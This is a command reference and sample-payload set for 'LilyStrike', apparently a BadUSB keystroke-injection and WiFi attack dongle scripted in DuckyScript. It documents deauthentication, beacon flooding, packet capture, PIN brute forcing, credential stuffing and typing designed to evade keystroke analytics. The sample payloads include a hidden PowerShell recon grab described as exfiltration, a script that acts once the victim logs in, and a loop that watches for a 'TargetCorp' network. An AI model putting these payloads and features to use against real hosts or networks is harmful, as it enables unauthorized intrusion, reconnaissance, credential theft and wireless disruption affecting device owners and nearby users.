# DuckyScript Reference (LilyStrike)

LilyStrike implements DuckyScript v3 core syntax plus ~30 device-specific commands. Scripts are stored encrypted on the SD card, edited in the browser IDE (BadUSB page), and executed by the HID keyboard against the host the dongle is plugged into.

- Line-based: **one command per line**, arguments after the command separated by spaces.
- Case-insensitive commands.
- Comments: `REM ...`, `REM_BLOCK_START ... REM_BLOCK_END`, or `# ...`.
- Unknown commands are logged as errors but **do not abort** the script.
- `STOP` (web UI button) aborts the script between lines.

---

## Core HID commands

| Command | Description |
|---|---|
| `DELAY <ms>` | Wait ms milliseconds |
| `DEFAULTDELAY <ms>` / `DEFAULT_DELAY <ms>` | Delay applied automatically *between every subsequent line* (either spelling) |
| `STRING <text>` | Types text as-is |
| `STRINGLN <text>` | Types text then presses Enter |
| `ENTER` / `SPACE` / `TAB` | Single key presses |

**Modifier combos** — put modifiers before a key on the same line:

```
GUI r          → Win+R
CTRL-SHIFT ESC → Task Manager
ALT F4
```

Modifiers: `GUI`/`WINDOWS`/`COMMAND`, `CTRL`/`CONTROL`, `ALT`, `SHIFT`, `ALTGR`.

**Special keys:** `ESCAPE` `DOWNARROW` `UPARROW` `LEFTARROW` `RIGHTARROW` `BACKSPACE` `DELETE` `HOME` `INSERT` `PAGEUP` `PAGEDOWN` `CAPSLOCK` `APP` `F1`–`F12`

---

## Flow control

| Command | Description |
|---|---|
| `REPEAT <n>` | Repeats the **previous command line** n times |
| `IF_OS <windows\|linux\|macos\|ios\|android\|chromeos\|unknown>` | Block: true if the fingerprinted host OS matches |
| `IF_SSID <ssid>` | Block: true if the AP is currently visible to the device |
| `IF_WIFI` | Block: true if the device's station link is connected |
| `ELSE` | Alternative branch (inherits the parent condition type) |
| `ELSE_IF <value>` | Alternative branch with a new condition (inherits type) |
| `END_IF` | Closes the block. Blocks nest. |
| `LABEL <name>` | Named marker (target for `ON_ERROR` and `GOTO`) |
| `GOTO <label>` | Unconditional jump to the label. Jump budget 256/script (loop guard) |
| `ON_ERROR <label>` | Jump to the label if any command errors afterwards |
| `RUN_SCRIPT <name>` | Execute another saved script inline (max nesting depth 3), then resume this one |
| `STOP` | Aborts the script (also the web Stop button) |

### OS fingerprinting

`DETECT_OS` fingerprints the host via the keyboard-LED side channel (~10 s, toggles lock keys and restores them). The result is cached until the dongle is unplugged and shown on the Status page. Run it once, then branch:

```
DETECT_OS
IF_OS windows
  GUI r
  DELAY 500
  STRING cmd /c whoami > %TEMP%\\p.txt
  ENTER
ELSE
  DELAY 500
  ALT F2
  STRING whoami
  ENTER
END_IF
```

### Variables

```
VAR name value        → define (value may contain $refs)
$name                 → substitute anywhere later
```

```
VAR port 8080
STRING listening on $port
```

Value commands can feed variables too: `RANDOM_NUM 1000 9999` types a number — combine with `VAR` and `$_` semantics where noted in the Reference page of the UI.

---

## Device commands

### Operator feedback

| Command | Description |
|---|---|
| `LED_ON <#RRGGBB>` | Solid LED color (e.g. `LED_ON #FF0000`) |
| `LED_OFF` | LED off |
| `LED_BLINK <times> <#RRGGBB>` | Blink n times in a color |
| `SCREEN_ON` / `SCREEN_OFF` | Backlight control |
| `SCREEN_CLR` | Clear the LCD |
| `SCREEN_TEXT <txt> [#fg #bg]` | Draw text on the LCD (optional 24-bit colors) |
| `SCREEN_STATS` | Show live status (RAM, IP, script state) on the LCD |
| `LOG <message>` | Write to the encrypted device log (viewable in Status → Log) |

### Typing helpers

| Command | Description |
|---|---|
| `HUMAN_TYPE <text>` | Types at ~40 wpm with per-character jitter (defeats keystroke timing analytics) |
| `RANDOM_NUM <min> <max>` | Types a random integer in range |
| `RANDOM_CHAR <len>` | Types len random alphanumeric chars |
| `GET_IP` | Types the device's current IP (or `no-ip`) |
| `DISABLE_CAPS` | Forces Caps Lock off before typing (avoids cased-typo tells) |

### Host interaction

| Command | Description |
|---|---|
| `WAIT_BUTTON [secs] [CONTINUE\|STOP]` | Pause until the BOOT button is pressed (default 30 s, CONTINUE afterwards) |
| `JIGGLE_MOUSE <secs>` | Subtle ±1 px mouse motion for n seconds |
| `MOUSE_CLICK <left\|right\|middle>` | Click a mouse button |
| `MOUSE_MOVE_SMOOTH <x> <y> <ms>` | Glide the cursor |
| `HOLD_KEY <key>` / `RELEASE_KEY <key>` | Hold a modifier across following lines |
| `TRIGGER_KEY <caps\|num\|scroll> <timeoutMs> <RUN\|SKIP>` | Wait for the host to toggle a lock LED (used to detect login) then run or skip |

### Networking

| Command | Description |
|---|---|
| `CONNECT_AP <ssid> [password]` | Join a network as a station (config AP stays up) |
| `DISCON_AP [erase]` | Drop the station link; `erase` also wipes saved credentials |
| `WIFI_CONNECTED` | Value command: station connected? (usable in `IF`) |
| `SSID_TRIGGER <ssid>` | Wait until an AP with this SSID becomes visible |
| `DEAUTH <ssid> [seconds]` | Deauthentication attack (blocks; device offline while attacking) |
| `SSID_SPAM <seconds> [name1,name2,...]` | Beacon flood of fake networks (blocks; device offline). No names = 16 random networks. Channel-sweeps so scanners on any channel see them |
| `PCAP_CAPTURE <seconds> [channel]` | Promiscuous WiFi capture to `/pcap/*.pcap` on the card |
| `TUNNEL ON\|OFF` | Enable/disable the external relay access |

### System

| Command | Description |
|---|---|
| `USB_STORAGE enable\|disable` | Expose/remove the SD card as a USB mass-storage drive |
| `BRUTEFORCE_PIN <len> [delayMs]` | Types numeric codes of the given length (0000, 0001, …) with delay between |
| `BRUTEFORCE_LOGIN /path/creds.txt` | Credential stuffing from an SD file, lines formatted `user:pass` or `user,pass` |
| `SELF_DESTRUCT` | **DESTRUCTIVE**: wipe secrets/settings and reboot |
| `RESET_FIRM` | **DESTRUCTIVE**: factory-reset all settings and reboot |

---

## Sample payloads

### 1. Windows info grab to a file

```
REM gather basic info into a temp file, exfil via the device log
DELAY 1000
GUI r
DELAY 300
STRING powerscript
ENTER
DELAY 600
STRING powershell -w hidden -c "whoami; ipconfig /all" | Out-File $env:TEMP\\info.txt
ENTER
```

### 2. Cross-platform "am I on the boss's laptop?"

```
DETECT_OS
IF_OS macos
  DELAY 800
  GUI SPACE
  DELAY 300
  STRING terminal
  ENTER
  DELAY 600
  STRING say "device attached"
  ENTER
END_IF
IF_OS windows
  LED_BLINK 3 #00FF00
END_IF
```

### 3. Wait for the user to log in, then act

```
REM waits for the Windows login screen to go away (LED activity)
TRIGGER_KEY caps 600000 RUN
DELAY 2000
GUI r
DELAY 300
STRING notepad
ENTER
DELAY 500
HUMAN_TYPE The dongle has been waiting for you.
```

### 4. Network-aware beacon

```
CONNECT_AP HomeNet MyPassword
IF_WIFI
  LOG attached and online
  LED_ON #00FF00
  GET_IP
ELSE
  LED_BLINK 5 #FF0000
  LOG no network available
END_IF
```

### 5. Mouse keeper (keep a session alive)

```
REPEAT 240
JIGGLE_MOUSE 15
DELAY 45000
```

### 6. PIN brute force (screen lock, port test — authorized devices only!)

```
GUI r
DELAY 300
STRING control
ENTER
DELAY 800
BRUTEFORCE_PIN 4 200
```

### 7. Modular payload (RUN_SCRIPT)

`main.ds`:
```
DETECT_OS
IF_OS windows
  RUN_SCRIPT win_recon.ds
END_IF
RUN_SCRIPT cleanup.ds
```

### 8. Simple patrol loop (GOTO)

```
LABEL top
IF_SSID TargetCorp
  LED_BLINK 3 #00FF00
  LOG target in range
END_IF
DELAY 30000
GOTO top
```
(Loop-guarded: 256 jumps max per run.)

### 9. Beacon flood

```
SSID_SPAM 60 CoffeeShop,Airport_Free_WiFi,Hotel_Guest,Starbucks WiFi
```

### 10. Scheduled recon (Autostart + Scheduler)

Autostart queue: `connect_wifi.ds`, then `recon.ds`.

`recon.ds`:
```
IF_WIFI
  LED_ON #0000FF
  SCREEN_STATS
  LOG periodic recon ran
END_IF
```

Add it in the **Scheduler** page with `intervalMin: 60` → runs hourly while the dongle has power.

---

## Execution model notes

- Scripts run in a dedicated FreeRTOS task — the web UI stays responsive while a payload types.
- The device **must** be plugged into the *target* (HID works over USB); the web UI is reachable over WiFi **at the same time**.
- Every script start/stop and every `LOG` line is appended to `/logs/system.log.enc` (encrypted). MSC/USB-storage mode and WiFi attacks pause log writes for data safety.
- A script that powers down, reboots (`RESET_FIRM`), or self-destructs obviously ends itself.
